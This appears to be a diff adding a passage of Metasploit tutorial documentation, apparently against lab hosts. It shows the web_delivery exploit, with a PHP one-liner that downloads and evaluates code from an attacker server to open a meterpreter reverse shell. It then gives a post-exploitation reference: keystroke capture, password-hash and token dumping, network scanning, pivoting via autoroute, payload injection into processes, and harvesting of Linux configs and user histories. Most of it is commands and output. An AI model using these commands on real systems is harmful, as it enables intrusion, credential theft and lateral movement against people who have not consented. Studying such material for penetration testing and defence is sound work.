+ Payload options (php/meterpreter/reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  192.168.80.128   yes       The listen address
+   LPORT  4444             yes       The listen port
+
+
+ Exploit target:
+
+   Id  Name
+   --  ----
+   1   PHP
+
+
+ msf exploit(web_delivery) > exploit
+ [*] Exploit running as background job.
+ [*] Started reverse handler on 192.168.80.128:4444
+ [*] Using URL: http://0.0.0.0:8080/alK3t3tt
+ [*] Local IP: http://192.168.80.128:8080/alK3t3tt
+ [*] Server started.
+ [*] Run the following command on the target machine:
+ php -d allow_url_fopen=true -r "eval(file_get_contents('http://192.168.80.128:8080/alK3t3tt'));"
+
+
+Next, we run the given command on the victim:
+
+::
+
+  php -d allow_url_fopen=true -r "eval(file_get_contents('http://192.168.80.128:8080/alK3t3tt'));"
+
+  .... image:: img/web_delivery3.png
+
+
+We can finally interact with the new shell in metasploit.
+
+::
+
+  msf exploit(web_delivery) >
+ [*] 192.168.80.131   web_delivery - Delivering Payload
+ [*] Sending stage (40499 bytes) to 192.168.80.131
+ [*] Meterpreter session 1 opened (192.168.80.128:4444 -> 192.168.80.131:53382) at 2016-02-06 10:27:05 -0500
+ msf exploit(web_delivery) > sessions -i
+
+ Active sessions
+ ===============
+
+  Id  Type                 Information                     Connection
+  --  ----                 -----------                     ----------
+  1   meterpreter php/php  www-data (33) @ metasploitable  192.168.80.128:4444 -> 192.168.80.131:53382 (192.168.80.131)
+
+ msf exploit(web_delivery) > sessions -i 1
+ [*] Starting interaction with 1...
+
+ meterpreter > shell
+ Process 5331 created.
+ Channel 0 created.
+ whoami
+ www-data
+ uname -a
+ Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux
+
+
+We now have a functioning php meterpreter shell on the target.
+
+
+*********************
+Post Module Reference
+**********************
+
+
+Windows
+===========
+
+Windows Post Capture Modules
+^^^^^^^^^^^^^^^^^^^^^^^^^^
+
+keylog_recorder
+""""""""""""""
+
+The “keylog_recorder” post module captures keystrokes on the compromised system. Note that you will want to ensure that you have migrated to an interactive process prior to capturing keystrokes.
+
+::
+
+  meterpreter >
+ Background session 1? [y/N] y
+ msf > use post/windows/capture/keylog_recorder
+ msf post(keylog_recorder) > info
+
+       Name: Windows Capture Keystroke Recorder
+     Module: post/windows/capture/keylog_recorder
+   Platform: Windows
+       Arch:
+       Rank: Normal
+
+ Provided by:
+  Carlos Perez
+  Josh Hale
+
+ Basic options:
+  Name          Current Setting  Required  Description
+  ----          ---------------  --------  -----------
+  CAPTURE_TYPE  explorer         no        Capture keystrokes for Explorer, Winlogon or PID (Accepted: explorer, winlogon, pid)
+  INTERVAL      5                no        Time interval to save keystrokes in seconds
+  LOCKSCREEN    false            no        Lock system screen.
+  MIGRATE       false            no        Perform Migration.
+  PID                            no        Process ID to migrate to
+  SESSION                        yes       The session to run this module on.
+
+ Description:
+  This module can be used to capture keystrokes. To capture keystrokes
+  when the session is running as SYSTEM, the MIGRATE option must be
+  enabled and the CAPTURE_TYPE option should be set to one of
+  Explorer, Winlogon, or a specific PID. To capture the keystrokes of
+  the interactive user, the Explorer option should be used with
+  MIGRATE enabled. Keep in mind that this will demote this session to
+  the user's privileges, so it makes sense to create a separate
+  session for this task. The Winlogon option will capture the username
+  and password entered into the logon and unlock dialog. The
+  LOCKSCREEN option can be combined with the Winlogon CAPTURE_TYPE to
+  for the user to enter their clear-text password. It is recommended
+  to run this module as a job, otherwise it will tie up your framework
+  user interface.
+
+ msf post(keylog_recorder) > sessions -i 1
+ [*] Starting interaction with 1...
+
+ meterpreter > run post/windows/capture/keylog_recorder
+
+ [*] Executing module against V-MAC-XP
+ [*] Starting the keystroke sniffer...
+ [*] Keystrokes being saved in to /root/.msf4/loot/20110421120355_default_192.168.1.195_host.windows.key_328113.txt
+ [*] Recording keystrokes...
+ ^C[*] Saving last few keystrokes...
+ [*] Interrupt
+ [*] Stopping keystroke sniffer...
+ meterpreter >
+
+
+After we have finished sniffing keystrokes, or even while the sniffer is still running, we can dump the captured data.
+
+::
+
+  root@kali:~# cat /root/.msf4/loot/20110421120355_default_192.168.1.195_host.windows.key_328113.txt
+ Keystroke log started at Thu Apr 21 12:03:55 -0600 2011
+ root  s3cr3t
+ ftp ftp.micro
+ soft.com  anonymous  anon@ano
+ n.com  e  quit
+ root@kali:~#
+
+
+Gather Modules
+^^^^^^^^^^^^^^^^
+
+Metasploit offers a number of post exploitation modules that allow for further information gathering on your target network.
+
+arp_scanner
+""""""""""""
+
+The “arp_scanner” post module will perform an ARP scan for a given range through a compromised host.
+
+::
+
+  meterpreter > run post/windows/gather/arp_scanner RHOSTS=192.168.1.0/24
+
+ [*] Running module against V-MAC-XP
+ [*] ARP Scanning 192.168.1.0/24
+ [*] 	IP: 192.168.1.1 MAC b2:a8:1d:e0:68:89
+ [*] 	IP: 192.168.1.2 MAC 0:f:b5:fc:bd:22
+ [*] 	IP: 192.168.1.11 MAC 0:21:85:fc:96:32
+ [*] 	IP: 192.168.1.13 MAC 78:ca:39:fe:b:4c
+ [*] 	IP: 192.168.1.100 MAC 58:b0:35:6a:4e:cc
+ [*] 	IP: 192.168.1.101 MAC 0:1f:d0:2e:b5:3f
+ [*] 	IP: 192.168.1.102 MAC 58:55:ca:14:1e:61
+ [*] 	IP: 192.168.1.105 MAC 0:1:6c:6f:dd:d1
+ [*] 	IP: 192.168.1.106 MAC c:60:76:57:49:3f
+ [*] 	IP: 192.168.1.195 MAC 0:c:29:c9:38:4c
+ [*] 	IP: 192.168.1.194 MAC 12:33:a0:2:86:9b
+ [*] 	IP: 192.168.1.191 MAC c8:bc:c8:85:9d:b2
+ [*] 	IP: 192.168.1.193 MAC d8:30:62:8c:9:ab
+ [*] 	IP: 192.168.1.201 MAC 8a:e9:17:42:35:b0
+ [*] 	IP: 192.168.1.203 MAC 3e:ff:3c:4c:89:67
+ [*] 	IP: 192.168.1.207 MAC c6:b3:a1:bc:8a:ec
+ [*] 	IP: 192.168.1.199 MAC 1c:c1:de:41:73:94
+ [*] 	IP: 192.168.1.209 MAC 1e:75:bd:82:9b:11
+ [*] 	IP: 192.168.1.220 MAC 76:c4:72:53:c1:ce
+ [*] 	IP: 192.168.1.221 MAC 0:c:29:d7:55:f
+ [*] 	IP: 192.168.1.250 MAC 1a:dc:fa:ab:8b:b
+ meterpreter >
+
+
+checkvm
+""""""""
+
+The “checkvm” post module, simply enough, checks to see if the compromised host is a virtual machine. This module supports Hyper-V, VMWare, VirtualBox, Xen, and QEMU virtual machines.
+
+::
+
+  meterpreter > run post/windows/gather/checkvm
+
+ [*] Checking if V-MAC-XP is a Virtual Machine .....
+ [*] This is a VMware Virtual Machine
+ meterpreter >
+
+
+credential_collector
+""""""""""""""""""""
+
+The “credential_collector” module harvests passwords hashes and tokens on the compromised host.
+
+::
+
+  meterpreter > run post/windows/gather/credentials/credential_collector
+
+ [*] Running module against V-MAC-XP
+ [+] Collecting hashes...
+    Extracted: Administrator:7bf4f254f224bb24aad3b435b51404ee:2892d23cdf84d7a70e2eb2b9f05c425e
+    Extracted: Guest:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
+    Extracted: HelpAssistant:2e61920ebe3ed6e6d108113bf6318ee2:5abb944dc0761399b730f300dd474714
+    Extracted: SUPPORT_388945a0:aad3b435b51404eeaad3b435b51404ee:92e5d2c675bed8d4dc6b74ddd9b4c287
+ [+] Collecting tokens...
+    NT AUTHORITY\LOCAL SERVICE
+    NT AUTHORITY\NETWORK SERVICE
+    NT AUTHORITY\SYSTEM
+    NT AUTHORITY\ANONYMOUS LOGON
+ meterpreter >
+
+
+dumplinks
+""""""""""""
+
+The “dumplinks” module parses the .lnk files in a users Recent Documents which could be useful for further information gathering. Note that, as shown below, we first need to migrate into a user process prior to running the module.
+
+::
+
+  meterpreter > run post/windows/manage/migrate
+
+ [*] Running module against V-MAC-XP
+ [*] Current server process: svchost.exe (1096)
+ [*] Migrating to explorer.exe...
+ [*] Migrating into process ID 1824
+ [*] New server process: Explorer.EXE (1824)
+ meterpreter > run post/windows/gather/dumplinks
+
+ [*] Running module against V-MAC-XP
+ [*] Extracting lnk files for user Administrator at C:\Documents and Settings\Administrator\Recent\...
+ [*] Processing: C:\Documents and Settings\Administrator\Recent\developers_guide.lnk.
+ [*] Processing: C:\Documents and Settings\Administrator\Recent\documentation.lnk.
+ [*] Processing: C:\Documents and Settings\Administrator\Recent\Local Disk (C).lnk.
+ [*] Processing: C:\Documents and Settings\Administrator\Recent\Netlog.lnk.
+ [*] Processing: C:\Documents and Settings\Administrator\Recent\notes (2).lnk.
+ [*] Processing: C:\Documents and Settings\Administrator\Recent\notes.lnk.
+ [*] Processing: C:\Documents and Settings\Administrator\Recent\Release.lnk.
+ [*] Processing: C:\Documents and Settings\Administrator\Recent\testmachine_crashie.lnk.
+ [*] Processing: C:\Documents and Settings\Administrator\Recent\user manual.lnk.
+ [*] Processing: C:\Documents and Settings\Administrator\Recent\user's guide.lnk.
+ [*] Processing: C:\Documents and Settings\Administrator\Recent\{33D9A762-90C8-11d0-BD43-00A0C911CE86}_load.lnk.
+ [*] No Recent Office files found for user Administrator. Nothing to do.
+ meterpreter >
+
+
+enum_applications
+"""""""""""""""
+
+The “enum_applications” module enumerates the applications that are installed on the compromised host.
+
+::
+
+  meterpreter > run post/windows/gather/enum_applications
+
+ [*] Enumerating applications installed on WIN7-X86
+
+ Installed Applications
+ ======================
+
+ Name                                                              Version
+ ----                                                              -------
+ Adobe Flash Player 25 ActiveX                                     25.0.0.148
+ Google Chrome                                                     58.0.3029.81
+ Google Update Helper                                              1.3.33.5
+ Google Update Helper                                              1.3.25.11
+ Microsoft .NET Framework 4.6.1                                    4.6.01055
+ Microsoft .NET Framework 4.6.1                                    4.6.01055
+ Microsoft Visual C++ 2008 Redistributable - x86 9.0.30729.4148    9.0.30729.4148
+ MySQL Connector Net 6.5.4                                         6.5.4
+ Security Update for Microsoft .NET Framework 4.6.1 (KB3122661)    1
+ Security Update for Microsoft .NET Framework 4.6.1 (KB3127233)    1
+ Security Update for Microsoft .NET Framework 4.6.1 (KB3136000v2)  2
+ Security Update for Microsoft .NET Framework 4.6.1 (KB3142037)    1
+ Security Update for Microsoft .NET Framework 4.6.1 (KB3143693)    1
+ Security Update for Microsoft .NET Framework 4.6.1 (KB3164025)    1
+ Update for Microsoft .NET Framework 4.6.1 (KB3210136)             1
+ Update for Microsoft .NET Framework 4.6.1 (KB4014553)             1
+ VMware Tools                                                      10.1.6.5214329
+ XAMPP 1.8.1-0                                                     1.8.1-0
+
+
+ [*] Results stored in: /root/.msf4/loot/20170501172851_pwk_192.168.0.6_host.application_876159.txt
+ meterpreter >
+
+
+enum_logged_on_users
+"""""""""""""""""""""""
+
+The “enum_logged_on_users” post module returns a listing of current and recently logged on users along with their SIDs.
+
+
+::
+
+  meterpreter > run post/windows/gather/enum_logged_on_users
+
+ [*] Running against session 1
+
+ Current Logged Users
+ ====================
+
+ SID                                            User
+ ---                                            ----
+ S-1-5-21-628913648-3499400826-3774924290-1000  WIN7-X86\victim
+ S-1-5-21-628913648-3499400826-3774924290-1004  WIN7-X86\hacker
+
+
+ [*] Results saved in: /root/.msf4/loot/20170501172925_pwk_192.168.0.6_host.users.activ_736219.txt
+
+ Recently Logged Users
+ =====================
+
+ SID                                            Profile Path
+ ---                                            ------------
+ S-1-5-18                                       %systemroot%\system32\config\systemprofile
+ S-1-5-19                                       C:\Windows\ServiceProfiles\LocalService
+ S-1-5-20                                       C:\Windows\ServiceProfiles\NetworkService
+ S-1-5-21-628913648-3499400826-3774924290-1000  C:\Users\victim
+ S-1-5-21-628913648-3499400826-3774924290-1004  C:\Users\hacker
+
+
+ meterpreter >
+
+
+enum_shares
+"""""""""""""
+
+The “enum_shares” post module returns a listing of both configured and recently used shares on the compromised system.
+
+::
+
+  meterpreter > run post/windows/gather/enum_shares
+
+ [*] Running against session 3
+ [*] The following shares were found:
+ [*] 	Name: Desktop
+ [*] 	Path: C:\Documents and Settings\Administrator\Desktop
+ [*] 	Type: 0
+ [*]
+ [*] Recent Mounts found:
+ [*] 	\\192.168.1.250\software
+ [*] 	\\192.168.1.250\Data
+ [*]
+ meterpreter >
+
+enum_snmp
+"""""""""""
+
+The “enum_snmp” module will enumerate the SNMP service configuration on the target, if present, including the community strings.
+
+::
+
+  meterpreter > run post/windows/gather/enum_snmp
+
+ [*] Running module against V-MAC-XP
+ [*] Checking if SNMP is Installed
+ [*] 	SNMP is installed!
+ [*] Enumerating community strings
+ [*]
+ [*] 	Comunity Strings
+ [*] 	================
+ [*]
+ [*] 	 Name    Type
+ [*] 	 ----    ----
+ [*] 	 public  READ ONLY
+ [*]
+ [*] Enumerating Permitted Managers for Community Strings
+ [*] 	Community Strings can be accessed from any host
+ [*] Enumerating Trap Configuration
+ [*] No Traps are configured
+ meterpreter >
+
+
+hashdump
+"""""""""""
+
+The “hashdump” post module will dump the local users accounts on the compromised host using the registry.
+
+::
+
+  meterpreter > run post/windows/gather/hashdump
+
+ [*] Obtaining the boot key...
+ [*] Calculating the hboot key using SYSKEY 8528c78df7ff55040196a9b670f114b6...
+ [*] Obtaining the user list and keys...
+ [*] Decrypting user keys...
+ [*] Dumping password hashes...
+
+
+ Administrator:500:7bf4f254b222ab21aad3b435b51404ee:2792d23cdf84d1a70e2eb3b9f05c425e:::
+ Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+ HelpAssistant:1000:2e61920ebe3ed6e6d108113bf6318ee2:5abb944dc0761399b730f300dd474714:::
+ SUPPORT_388945a0:1002:aad3b435b51404eeaad3b435b51404ee:92e5d2c675bed8d4dc6b74ddd9b4c287:::
+
+
+ meterpreter >
+
+
+usb_history
+"""""""""""
+
+The “usb_history” module enumerates the USB drive history on the compromised system.
+
+::
+
+  meterpreter > run post/windows/gather/usb_history
+
+ [*] Running module against V-MAC-XP
+ [*]
+   C:	                                                             Disk ea4cea4c
+   E:	STORAGE#RemovableMedia#8&3a01dffe&0&RM#{53f5630d-b6bf-11d0-94f2-00a0c91efb8b}
+   A:	FDC#GENERIC_FLOPPY_DRIVE#6&1435b2e2&0&0#{53f5630d-b6bf-11d0-94f2-00a0c91efb8b}
+   D:	IDE#CdRomNECVMWar_VMware_IDE_CDR10_______________1.00____#3031303030303030303030303030303030303130#{53f5630d-b6bf-11d0-94f2-00a0c91efb8b}
+
+ [*] Kingston DataTraveler 2.0 USB Device
+ =====================================================================================
+   Disk lpftLastWriteTime	                    Thu Apr 21 13:09:42 -0600 2011
+ Volume lpftLastWriteTime	                    Thu Apr 21 13:09:43 -0600 2011
+             Manufacturer	                            (Standard disk drives)
+           ParentIdPrefix	                                      8&3a01dffe&0 (   E:)
+                    Class	                                         DiskDrive
+                   Driver	       {4D36E967-E325-11CE-BFC1-08002BE10318}\0001
+
+ meterpreter >
+
+
+
+local_exploit_suggester
+"""""""""""""""""""""""
+
+The “local_exploit_suggester”, or Lester for short, scans a system for local vulnerabilities contained in Metasploit. It then makes suggestions based on the results as well as displays exploit’s location for quicker access.
+
+::
+
+  msf > use post/multi/recon/local_exploit_suggester
+ msf post(local_exploit_suggester) > show options
+
+ Module options (post/multi/recon/local_exploit_suggester):
+
+   Name             Current Setting  Required  Description
+   ----             ---------------  --------  -----------
+   SESSION          2                yes       The session to run this module on.
+   SHOWDESCRIPTION  false            yes       Displays a detailed description for the available exploits
+
+ msf post(local_exploit_suggester) > run
+
+ [*] 192.168.101.129 - Collecting local exploits for x86/windows...
+ [*] 192.168.101.129 - 31 exploit checks are being tried...
+ [+] 192.168.101.129 - exploit/windows/local/ms10_015_kitrap0d: The target service is running, but could not be validated.
+ [+] 192.168.101.129 - exploit/windows/local/ms10_092_schelevator: The target appears to be vulnerable.
+ [+] 192.168.101.129 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
+ [+] 192.168.101.129 - exploit/windows/local/ms15_004_tswbproxy: The target service is running, but could not be validated.
+ [+] 192.168.101.129 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
+ [*] Post module execution completed
+
+
+Manage Modules
+^^^^^^^^^^^^^^
+
+autoroute
+""""""""""""
+
+The “autoroute” post module creates a new route through a Meterpreter sessions allowing you to pivot deeper into a target network.
+
+::
+
+  meterpreter > run post/windows/manage/autoroute SUBNET=192.168.218.0 ACTION=ADD
+
+ [*] Running module against V-MAC-XP
+ [*] Adding a route to 192.168.218.0/255.255.255.0...
+ meterpreter >
+ Background session 5? [y/N]  y
+
+With our new route added, we can run additional modules through our pivot.
+
+::
+
+  msf exploit(ms08_067_netapi) > use auxiliary/scanner/portscan/tcp
+ msf auxiliary(tcp) > set RHOSTS 192.168.218.0/24
+ RHOSTS => 192.168.218.0/24
+ msf auxiliary(tcp) > set THREADS 50
+ THREADS => 50
+ msf auxiliary(tcp) > set PORTS 445
+ PORTS => 445
+ msf auxiliary(tcp) > run
+
+ [*] Scanned 027 of 256 hosts (010% complete)
+ [*] Scanned 052 of 256 hosts (020% complete)
+ [*] Scanned 079 of 256 hosts (030% complete)
+ [*] Scanned 103 of 256 hosts (040% complete)
+ [*] Scanned 128 of 256 hosts (050% complete)
+ [*] 192.168.218.136:445 - TCP OPEN
+ [*] Scanned 154 of 256 hosts (060% complete)
+ [*] Scanned 180 of 256 hosts (070% complete)
+ [*] Scanned 210 of 256 hosts (082% complete)
+ [*] Scanned 232 of 256 hosts (090% complete)
+ [*] Scanned 256 of 256 hosts (100% complete)
+ [*] Auxiliary module execution completed
+ msf auxiliary(tcp) >
+
+
+delete_user
+"""""""""""
+
+The “delete_user” post module deletes a specified user account from the compromised system.
+
+::
+
+  meterpreter > run post/windows/manage/delete_user USERNAME=hacker
+
+ [*] User was deleted!
+ meterpreter >
+
+
+We can them dump the hashes on the system and verify that the user no longer exists on the target.
+
+::
+
+  meterpreter > run post/windows/gather/hashdump
+
+ [*] Obtaining the boot key...
+ [*] Calculating the hboot key using SYSKEY 8528c78df7ff55040196a9b670f114b6...
+ [*] Obtaining the user list and keys...
+ [*] Decrypting user keys...
+ [*] Dumping password hashes...
+
+
+ Administrator:500:7bf4f254b228bb24aad1b435b51404ee:2892d26cdf84d7a70e2fb3b9f05c425e:::
+ Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+ HelpAssistant:1000:2e61920ebe3ed6e6d108113bf6318ee2:5abb944dc0761399b730f300dd474714:::
+ SUPPORT_388945a0:1002:aad3b435b51404eeaad3b435b51404ee:92e5d2c675bed8d4dc6b74ddd9b4c287:::
+
+
+ meterpreter >
+
+
+migrate
+"""""""""
+
+The “migrate” post module will migrate to a specified process or if none is given, will automatically spawn a new process and migrate to it.
+
+::
+
+  meterpreter > run post/windows/manage/migrate
+
+ [*] Running module against V-MAC-XP
+ [*] Current server process: svchost.exe (1092)
+ [*] Migrating to explorer.exe...
+ [*] Migrating into process ID 672
+ [*] New server process: Explorer.EXE (672)
+ meterpreter >
+
+
+multi_meterpreter_inject
+"""""""""""""""""""""""""
+
+The “multi_meterpreter_inject” post module will inject a given payload into a process on the compromised host. If no PID value is specified, a new process will be created and the payload injected into it. Although, the name of the module is multi_meterpreter_inject, any payload can be specified.
+
+::
+
+  meterpreter > run post/windows/manage/multi_meterpreter_inject PAYLOAD=windows/shell_bind_tcp
+
+ [*] Running module against V-MAC-XP
+ [*] Creating a reverse meterpreter stager: LHOST=192.168.1.101 LPORT=4444
+ [+] Starting Notepad.exe to house Meterpreter Session.
+ [+] Process created with pid 3380
+ [*] Injecting meterpreter into process ID 3380
+ [*] Allocated memory at address 0x003a0000, for 341 byte stager
+ [*] Writing the stager into memory...
+ [+] Successfully injected Meterpreter in to process: 3380
+
+ meterpreter > ^Z
+ Background session 5? [y/N] y
+ msf exploit(handler) > connect 192.168.1.195 4444
+ [*] Connected to 192.168.1.195:4444
+ Microsoft Windows XP [Version 5.1.2600]
+ (C) Copyright 1985-2001 Microsoft Corp.
+
+ C:\WINDOWS\system32>ipconfig
+ ipconfig
+
+ Windows IP Configuration
+
+
+ Ethernet adapter Local Area Connection:
+
+        Connection-specific DNS Suffix  . : localdomain
+        IP Address. . . . . . . . . . . . : 192.168.1.195
+        Subnet Mask . . . . . . . . . . . : 255.255.255.0
+        Default Gateway . . . . . . . . . : 192.168.1.1
+
+ Ethernet adapter Local Area Connection 2:
+
+        Connection-specific DNS Suffix  . : localdomain
+        IP Address. . . . . . . . . . . . : 192.168.218.136
+        Subnet Mask . . . . . . . . . . . : 255.255.255.0
+        Default Gateway . . . . . . . . . : 192.168.218.2
+
+ C:\WINDOWS\system32>
+
+
+
+Linux
+============
+
+Gather Modules
+^^^^^^^^^^^^^^
+
+checkvm
+""""""""""
+
+The checkvm module attempts to determine whether the system is running inside of a virtual environment and if so, which one. This module supports detection of Hyper-V, VMWare, VirtualBox, Xen, and QEMU/KVM.
+
+::
+
+  msf > use post/linux/gather/checkvm
+ msf post(checkvm) > show options
+
+ Module options (post/linux/gather/checkvm):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   SESSION  1                yes       The session to run this module on.
+
+ msf post(checkvm) > run
+
+ [*] Gathering System info ....
+ [+] This appears to be a 'VMware' virtual machine
+ [*] Post module execution completed
+
+
+enum_configs
+""""""""""""""
+
+The enum_configs module collects configuration files found on commonly installed applications and services, such as Apache, MySQL, Samba, Sendmail, etc. If a config file is found in its default path, the module will assume that is the file we want.
+
+
+::
+
+  msf  > use post/linux/gather/enum_configs
+ msf post(enum_configs) > show options
+
+ Module options (post/linux/gather/enum_configs):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   SESSION  1                yes       The session to run this module on.
+
+ msf post(enum_configs) > run
+
+ [*] Running module against kali
+ [*] Info:
+ [*] 	Kali GNU/Linux 1.0.6
+ [*] 	Linux kali 3.12-kali1-486 #1 Debian 3.12.6-2kali1 (2014-01-06) i686 GNU/Linux
+ [*] apache2.conf stored in /root/.msf4/loot/20140228005504_default_192.168.1.109_linux.enum.conf_735045.txt
+ [*] ports.conf stored in /root/.msf4/loot/20140228005504_default_192.168.1.109_linux.enum.conf_787442.txt
+ [*] nginx.conf stored in /root/.msf4/loot/20140228005504_default_192.168.1.109_linux.enum.conf_248658.txt
+ [*] my.cnf stored in /root/.msf4/loot/20140228005505_default_192.168.1.109_linux.enum.conf_577389.txt
+ [*] shells stored in /root/.msf4/loot/20140228005507_default_192.168.1.109_linux.enum.conf_583272.txt
+ [*] sepermit.conf stored in /root/.msf4/loot/20140228005507_default_192.168.1.109_linux.enum.conf_027227.txt
+ [*] ca-certificates.conf stored in /root/.msf4/loot/20140228005508_default_192.168.1.109_linux.enum.conf_626893.txt
+ [*] access.conf stored in /root/.msf4/loot/20140228005508_default_192.168.1.109_linux.enum.conf_619382.txt
+ [*] rpc stored in /root/.msf4/loot/20140228005509_default_192.168.1.109_linux.enum.conf_666867.txt
+ [*] debian.cnf stored in /root/.msf4/loot/20140228005509_default_192.168.1.109_linux.enum.conf_173984.txt
+ [*] chkrootkit.conf stored in /root/.msf4/loot/20140228005510_default_192.168.1.109_linux.enum.conf_025881.txt
+ [*] logrotate.conf stored in /root/.msf4/loot/20140228005510_default_192.168.1.109_linux.enum.conf_438551.txt
+ [*] smb.conf stored in /root/.msf4/loot/20140228005511_default_192.168.1.109_linux.enum.conf_545804.txt
+ [*] ldap.conf stored in /root/.msf4/loot/20140228005511_default_192.168.1.109_linux.enum.conf_464721.txt
+ [*] sysctl.conf stored in /root/.msf4/loot/20140228005513_default_192.168.1.109_linux.enum.conf_077261.txt
+ [*] proxychains.conf stored in /root/.msf4/loot/20140228005513_default_192.168.1.109_linux.enum.conf_855958.txt
+ [*] snmp.conf stored in /root/.msf4/loot/20140228005514_default_192.168.1.109_linux.enum.conf_291777.txt
+ [*] Post module execution completed
+
+
+enum_network
+""""""""""""
+
+The enum_network module gathers network information from the target system IPTables rules, interfaces, wireless information, open and listening ports, active network connections, DNS information and SSH information.
+
+::
+
+  msf > use post/linux/gather/enum_network
+ msf post(enum_network) > show options
+
+ Module options (post/linux/gather/enum_network):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   SESSION  1                yes       The session to run this module on.
+
+ msf post(enum_network) > run
+
+ [*] Running module against kali
+ [*] Module running as root
+ [+] Info:
+ [+] 	Kali GNU/Linux 1.0.6
+ [+] 	Linux kali 3.12-kali1-486 #1 Debian 3.12.6-2kali1 (2014-01-06) i686 GNU/Linux
+ [*] Collecting data...
+ [*] Network config stored in /root/.msf4/loot/20140228005655_default_192.168.1.109_linux.enum.netwo_533784.txt
+ [*] Route table stored in /root/.msf4/loot/20140228005655_default_192.168.1.109_linux.enum.netwo_173980.txt
+ [*] Firewall config stored in /root/.msf4/loot/20140228005655_default_192.168.1.109_linux.enum.netwo_332941.txt
+ [*] DNS config stored in /root/.msf4/loot/20140228005655_default_192.168.1.109_linux.enum.netwo_007812.txt
+ [*] SSHD config stored in /root/.msf4/loot/20140228005655_default_192.168.1.109_linux.enum.netwo_912697.txt
+ [*] Host file stored in /root/.msf4/loot/20140228005655_default_192.168.1.109_linux.enum.netwo_477226.txt
+ [*] Active connections stored in /root/.msf4/loot/20140228005655_default_192.168.1.109_linux.enum.netwo_052505.txt
+ [*] Wireless information stored in /root/.msf4/loot/20140228005655_default_192.168.1.109_linux.enum.netwo_069586.txt
+ [*] Listening ports stored in /root/.msf4/loot/20140228005655_default_192.168.1.109_linux.enum.netwo_574507.txt
+ [*] If-Up/If-Down stored in /root/.msf4/loot/20140228005655_default_192.168.1.109_linux.enum.netwo_848840.txt
+ [*] Post module execution completed
+
+
+enum_protections
+"""""""""""""""""
+
+The enum_protections module tries to find certain installed applications that can be used to prevent, or detect our attacks, which is done by locating certain binary locations, and see if they are indeed executables. For example, if we are able to run ‘snort’ as a command, we assume it’s one of the files we are looking for. This module is meant to cover various antivirus, rootkits, IDS/IPS, firewalls, and other software.
+
+::
+
+  msf > use post/linux/gather/enum_protections
+ msf post(enum_protections) > show options
+
+ Module options (post/linux/gather/enum_protections):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   SESSION  1                yes       The session to run this module on.
+
+ msf post(enum_protections) > run
+
+ [*] Running module against kali
+ [*] Info:
+ [*] 	Kali GNU/Linux 1.0.6
+ [*] 	Linux kali 3.12-kali1-486 #1 Debian 3.12.6-2kali1 (2014-01-06) i686 GNU/Linux
+ [*] Finding installed applications...
+ [+] truecrypt found: /usr/bin/truecrypt
+ [+] logrotate found: /usr/sbin/logrotate
+ [+] chkrootkit found: /usr/sbin/chkrootkit
+ [+] lynis found: /usr/sbin/lynis
+ [+] tcpdump found: /usr/sbin/tcpdump
+ [+] proxychains found: /usr/bin/proxychains
+ [+] wireshark found: /usr/bin/wireshark
+ [*] Installed applications saved to notes.
+ [*] Post module execution completed
+
+
+enum_system
+"""""""""""
+
+The enum_system module gathers system information. It collects installed packages, installed services, mount information, user list, user bash history and cron jobs
+
+::
+
+  msf > use post/linux/gather/enum_system
+ msf post(enum_system) > show options
+
+ Module options (post/linux/gather/enum_system):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   SESSION  1                yes       The session to run this module on.
+
+ msf post(enum_system) > run
+
+ [+] Info:
+ [+] 	Kali GNU/Linux 1.0.6
+ [+] 	Linux kali 3.12-kali1-486 #1 Debian 3.12.6-2kali1 (2014-01-06) i686 GNU/Linux
+ [*] Linux version stored in /root/.msf4/loot/20140228005325_default_192.168.1.109_linux.enum.syste_186949.txt
+ [*] User accounts stored in /root/.msf4/loot/20140228005325_default_192.168.1.109_linux.enum.syste_538758.txt
+ [*] Installed Packages stored in /root/.msf4/loot/20140228005325_default_192.168.1.109_linux.enum.syste_116127.txt
+ [*] Running Services stored in /root/.msf4/loot/20140228005325_default_192.168.1.109_linux.enum.syste_805781.txt
+ [*] Cron jobs stored in /root/.msf4/loot/20140228005325_default_192.168.1.109_linux.enum.syste_460600.txt
+ [*] Disk info stored in /root/.msf4/loot/20140228005325_default_192.168.1.109_linux.enum.syste_538625.txt
+ [*] Logfiles stored in /root/.msf4/loot/20140228005325_default_192.168.1.109_linux.enum.syste_922920.txt
+ [*] Setuid/setgid files stored in /root/.msf4/loot/20140228005325_default_192.168.1.109_linux.enum.syste_076798.txt
+ [*] Post module execution completed
+
+
+enum_users_history
+"""""""""""""""""""
+
+The enum_users_history module gathers user specific information. User list, bash history, mysql history, vim history, lastlog and sudoers.
+
+
+::
+
+  msf > use post/linux/gather/enum_users_history
+ msf post(enum_users_history) > show options
+
+ Module options (post/linux/gather/enum_users_history):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   SESSION  1                yes       The session to run this module on.
+
+ msf post(enum_users_history) > run
+
+ [+] Info:
+ [+] 	Kali GNU/Linux 1.0.6
+ [+] 	Linux kali 3.12-kali1-486 #1 Debian 3.12.6-2kali1 (2014-01-06) i686 GNU/Linux
+ [*] History for root stored in /root/.msf4/loot/20140228005914_default_192.168.1.109_linux.enum.users_491309.txt
+ [*] History for root stored in /root/.msf4/loot/20140228005930_default_192.168.1.109_linux.enum.users_349754.txt
+ [*] Last logs stored in /root/.msf4/loot/20140228010003_default_192.168.1.109_linux.enum.users_170027.txt
+ [*] Sudoers stored in /root/.msf4/loot/20140228010003_default_192.168.1.109_linux.enum.users_210141.txt
+ [*] Post module execution completed
+
+
+OS X
+==========
+
+Gather Modules
+^^^^^^^^^^^^^^^^
+
+enum_osx
+""""""""""
+
